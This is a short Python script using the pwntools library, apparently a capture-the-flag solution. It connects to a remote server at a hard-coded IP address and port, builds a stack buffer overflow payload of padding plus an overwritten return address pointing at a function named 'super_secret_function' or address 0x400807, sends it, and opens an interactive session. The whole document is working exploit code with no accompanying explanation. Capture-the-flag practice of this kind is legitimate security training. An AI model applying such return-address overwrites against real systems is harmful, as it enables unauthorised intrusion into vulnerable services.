from pwn import *
p=remote('1.14.71.254',28716)
#p = process('./g')
elf=ELF("./g")
add=0x400807
add2=elf.symbols["super_secret_function"]
#payload=b'A'*0x10+p64(add2)
payload=b'A'*(0x2+0x8)+p64(add)
p.sendline(payload)
p.interactive()
